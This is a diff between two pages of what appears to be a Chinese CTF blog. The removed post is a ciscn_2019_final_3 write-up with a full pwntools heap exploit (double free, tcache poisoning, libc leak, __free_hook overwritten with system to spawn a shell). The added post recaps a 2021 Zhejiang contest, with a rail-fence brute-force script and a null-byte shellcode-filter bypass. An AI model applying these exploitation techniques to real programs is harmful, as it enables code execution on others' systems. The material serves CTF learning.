@@ -15,15 +15,15 @@
 
 
 
-<meta name="description" content="buu刷题记录：ciscn_final_3">
+<meta name="description" content="作者因为之前电脑丢了导致中间两个月断更，最近会把之前的很多都补回来。言归正传，这次比赛总体来说不太理想，没有达到预期。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ciscn2019_final_3 writeup">
-<meta property="og:url" content="http://example.com/2021/11/01/ciscn2019_final_3%20writeup/index.html">
+<meta property="og:title" content="2021浙江省预赛">
+<meta property="og:url" content="http://example.com/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/index.html">
 <meta property="og:site_name" content="xia0ji233&#39;s blog">
-<meta property="og:description" content="buu刷题记录：ciscn_final_3">
+<meta property="og:description" content="作者因为之前电脑丢了导致中间两个月断更，最近会把之前的很多都补回来。言归正传，这次比赛总体来说不太理想，没有达到预期。">
 <meta property="og:locale">
-<meta property="article:published_time" content="2021-11-01T14:00:00.000Z">
-<meta property="article:modified_time" content="2021-11-01T15:26:46.610Z">
+<meta property="article:published_time" content="2021-10-23T14:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-03T04:09:24.147Z">
 <meta property="article:author" content="xia0ji233">
 <meta name="twitter:card" content="summary">
 
@@ -59,7 +59,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>ciscn2019_final_3 writeup | xia0ji233&#39;s blog</title>
+<title>2021浙江省预赛 | xia0ji233&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -202,11 +202,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-ciscn2019_final_3 writeup" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-zjctf2021 预赛" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/11/01/ciscn2019_final_3%20writeup/" class="article-date">
-      <time datetime="2021-11-01T14:00:00.000Z" itemprop="datePublished">2021-11-01</time>
+      <a href="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/" class="article-date">
+      <time datetime="2021-10-23T14:00:00.000Z" itemprop="datePublished">2021-10-23</time>
 </a>
 
 
@@ -221,7 +221,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ciscn2019_final_3 writeup
+      2021浙江省预赛
     </h1>
   
 
@@ -230,7 +230,7 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/ctf/">ctf</a><a class="article-category-link" href="/categories/ctf/pwn/">pwn</a>
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
     </div>
 
 
@@ -242,13 +242,34 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>buu刷题记录：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_final_3">ciscn_final_3</a></p>
+        <p>作者因为之前电脑丢了导致中间两个月断更，最近会把之前的很多都补回来。言归正传，这次比赛总体来说不太理想，没有达到预期。</p>
 <span id="more"></span>
 
-<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>今天解决了C++文件换版本的问题，也是一刻没耽误直接做了这道C++题目，不得不说太爽了啊，再也不用因为题目是C++写的就做不了了，话不多说来看文件。</p>
-<h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>题目告知是ubuntu18版本的，给了libc.so.6文件，但是盲猜跟它自己的一样，那就先换好elf文件的版本。checksec观察保护全开。然后IDA打开一看，发现是经典的堆菜单题，提供了两种操作，add和delete。delete很明显free之后指针没有清零，存在UAF漏洞，并且add只允许下标开到0x18，也就是0~24总共能add 25次。然后大小限制在了fastbin大小的范围内，但是很贴心地，每次add之后给了malloc之后的地址。那么大概率通过这里泄露（ps:一开始并没有想到，还想着用IO泄露来着的），思路大概是先通过一次double free修改一个chunk的size为其它大小，然后free一次，再修改成非fastbin范围的堆块，并且防止堆块放入unsortedbin被check fail，最好不要构造堆相互重叠(这句话的意思差不多就是尽量让小堆块完全被大堆块包含，因为它会检测next chunk的)。然后出来了libc的地址之后准备好之前被free的堆块，add添加之后libc地址落入tcache中，再次add泄露这个地址，然后就很简单了，double free劫持free_hook为system函数，再free一个带有/bin/sh字符串的堆块即可getshell。</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;something&#x27;</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> index==<span class="number">11</span>:<span class="keyword">return</span> </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    <span class="comment">#if index==11:gdb.attach(p)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./ciscn_final_3&#x27;</span>,<span class="number">28019</span>)</span><br><span class="line">heap_addr=add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#double free保存一个free的0x30堆块在0号堆块位置</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))<span class="comment">#构造非fastbin大小的堆块</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):<span class="comment">#填满tcache 使其落入unsorted bin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">libc_addr=add(<span class="number">10</span>,<span class="number">0x28</span>,<span class="string">b&#x27;\0&#x27;</span>)-<span class="number">0x3ebca0</span><span class="comment">#泄露libc地址</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#劫持freehook</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">15</span>)<span class="comment">#getshell</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="比赛情况总结"><a href="#比赛情况总结" class="headerlink" title="比赛情况总结"></a>比赛情况总结</h2><p>我，学姐，学长分别出一题，最终得分350，排名在42。而我是出了一道密码题，pwn题没出，因为pwn题一道shellcode题当时分析没有考虑\0截断的这个特性，以为所有shellcode都要满足这个特性，觉得手撕汇编撕不过，就放弃了，没想到竟是一个\0绕过，这波，属实大意了闪了。</p>
+<h2 id="部分题目writeup"><a href="#部分题目writeup" class="headerlink" title="部分题目writeup"></a>部分题目writeup</h2><h3 id="Crypto-Easy-Railfence"><a href="#Crypto-Easy-Railfence" class="headerlink" title="Crypto-Easy Railfence"></a>Crypto-Easy Railfence</h3><p>观察加密方式，发现这个加密只进行了位置对换，并且开头特意提醒flag的形式为 flag{} ，那么先根据 已有长度写出参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 
+<p>现在Rail和offset不确定，但是 flag的格式确定，因此对参数进行爆破，然后观察发现l和g还有{}在整个 给的加密结果中只有一个并且位置已经确定，那么根据这个特性写出如下脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encrypt函数将结尾的print (d)改成了return d</span></span><br><span class="line"><span class="keyword">for</span> Rail <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line">	<span class="keyword">for</span> Offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">if</span> encrypt(m, Rail , Offset)[<span class="number">23</span>:<span class="number">25</span>]==<span class="string">&#x27;&#125;l&#x27;</span>:</span><br><span class="line">			<span class="built_in">print</span>(Rail,Offset)</span><br></pre></td></tr></table></figure>
+
+<p>得到两个结果 13 5和13 29，填充位位数多了应该有一定的规律，因此offset取5即可。</p>
+<p> 由于这个加密方式只交换位置，因此我在某一位多的一个字符必然会在另一个位置一模一样的出现，将 已匹配的字符数作为该为有没有匹配的条件逐位爆破即可，以下为完整脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target=<span class="string">&#x27;reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">c,rails,offset</span>):</span></span><br><span class="line">	c = <span class="string">&#x27;$&#x27;</span> * offset + c</span><br><span class="line">	length = <span class="built_in">len</span>(c)</span><br><span class="line">	result = &#123;x: <span class="string">&quot;&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(rails)&#125;</span><br><span class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">		width = rails * <span class="number">2</span> - <span class="number">2</span></span><br><span class="line">        num = a % width</span><br><span class="line">        <span class="keyword">if</span> (num &lt; rails):</span><br><span class="line">    		result.update(&#123;num: result[num] + c[a]&#125;)</span><br><span class="line">    	<span class="keyword">else</span>:</span><br><span class="line">            ll = <span class="number">2</span> * rails - <span class="number">2</span> - num</span><br><span class="line">            result.update(&#123;ll: result[ll] + c[a]&#125;)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(rails):</span><br><span class="line">    	d = d + result[k]</span><br><span class="line">    d = d.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span>(<span class="params">str1,str2</span>):</span></span><br><span class="line">    ans=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    	<span class="keyword">if</span>(str1[i]==str2[i]):ans+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">Rail=<span class="number">13</span></span><br><span class="line">Offset=<span class="number">5</span></span><br><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for Rail in range(2,20):</span></span><br><span class="line"><span class="string">    for Offset in range(0,30):</span></span><br><span class="line"><span class="string">        if encrypt(m, Rail , Offset)[23:25]==&#x27;&#125;l&#x27;:</span></span><br><span class="line"><span class="string">        	print(Rail,Offset)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">63</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        m=m[:i]+<span class="built_in">chr</span>(j)+m[i+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> compare(target,encrypt(m, Rail , Offset))==i+<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
+
+<p>![1](zjpc2021 预赛/1.png)</p>
+<p>得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;YOucanc1imb0verthefenceeveny0udOnotunderstandhowitworks!=&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再放工具md5即可。</p>
+<p>可能是固定的算法思维吧，就只想到这个，忘了有工具这种东西了。参数解出来放在CyberChef中可以直接一把梭。</p>
+<h3 id="pwn-sx"><a href="#pwn-sx" class="headerlink" title="pwn-sx"></a>pwn-sx</h3><p>![2](zjpc2021 预赛\2.png)</p>
+<p>分析文件是一道shellcode 题目，然后输入的shellcode经过传参到这个函数来判断是否合法，我以为都要满足，然后小算了一下发现限制很多，分组限制，当时我挺绝望的，想着这谁能做啊。可是结束之后我才想到可以\0字节绕过判断后面直接跟上shellcode ，只要保证前面能正确执行指令满足那些条件就可以。这里需要用到CyberChef工具中的disassemble，可以直接根据字节码转出来汇编指令，只要执行不产生异常，不让它指令偏移那就都可以放上来。</p>
+<p>小算一波，发现下标%3=0的字节只能在[0xc0-0xff]范围内，%3=1和%3=2的则在0x80-0xbf的范围内。那就一个个指令尝试过去，最后发现一个很合适的。</p>
+<p>![3](zjpc2021 预赛\3.png)</p>
+<p>执行完之后刚好能在最后一个00字节之后，后面填上shellcode直接打就结束了，下面附上本地运行结果。</p>
+<p>![4](zjpc2021 预赛\4.png)</p>
+<p>![5](zjpc2021 预赛\5.png)</p>
+<p>经过本次比赛，也意识到自己的不足应该是这些基础知识，算法优势应当好好利用起来去破密码试试看。总之，初赛过去，就得看向决赛了，争取在决赛上能一鸣惊人，加油！</p>
 
       
     </div>
@@ -257,13 +278,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2021/11/01/ciscn2019_final_3%20writeup/">ciscn2019_final_3 writeup</a></p>
+        <p><span>本文标题:</span><a href="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/">2021浙江省预赛</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
-        <p><span>发布时间:</span>2021-11-01, 22:00:00</p>
-        <p><span>最后更新:</span>2021-11-01, 23:26:46</p>
+        <p><span>发布时间:</span>2021-10-23, 22:00:00</p>
+        <p><span>最后更新:</span>2021-11-03, 12:09:24</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/11/01/ciscn2019_final_3%20writeup/" title="ciscn2019_final_3 writeup">http://example.com/2021/11/01/ciscn2019_final_3%20writeup/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/11/01/ciscn2019_final_3%20writeup/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/" title="2021浙江省预赛">http://example.com/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -276,15 +297,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/11/02/WUSTCTF2020%20level4%20writeup/">
-                    WUSTCTF2020 level4 writeup
+                <a href="/2021/10/23/zjpc2021%20%E9%A2%84%E8%B5%9B/">
+                    2021浙江省预赛
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/">
-                    关于C++文件换libc版本的问题
+                <a href="/2021/08/15/babyfengshui_33c3_2016%20writeup/">
+                    babyfengshui_33c3_2016 writeup
                 </a>
             </div>
         
@@ -296,7 +317,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90elf%E6%96%87%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">静态分析elf文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E6%83%85%E5%86%B5%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">比赛情况总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup"><span class="toc-number">2.</span> <span class="toc-text">部分题目writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto-Easy-Railfence"><span class="toc-number">2.1.</span> <span class="toc-text">Crypto-Easy Railfence</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-sx"><span class="toc-number">2.2.</span> <span class="toc-text">pwn-sx</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -332,7 +353,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"ciscn2019_final_3 writeup　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"2021浙江省预赛　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -352,7 +373,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/11/02/WUSTCTF2020%20level4%20writeup/" title="上一篇: WUSTCTF2020 level4 writeup">
+            <a href="/2021/10/23/zjpc2021%20%E9%A2%84%E8%B5%9B/" title="上一篇: 2021浙江省预赛">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -360,7 +381,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/" title="下一篇: 关于C++文件换libc版本的问题">
+            <a href="/2021/08/15/babyfengshui_33c3_2016%20writeup/" title="下一篇: babyfengshui_33c3_2016 writeup">
                 <i class="fa fa-angle-right"></i>
             </a>
         
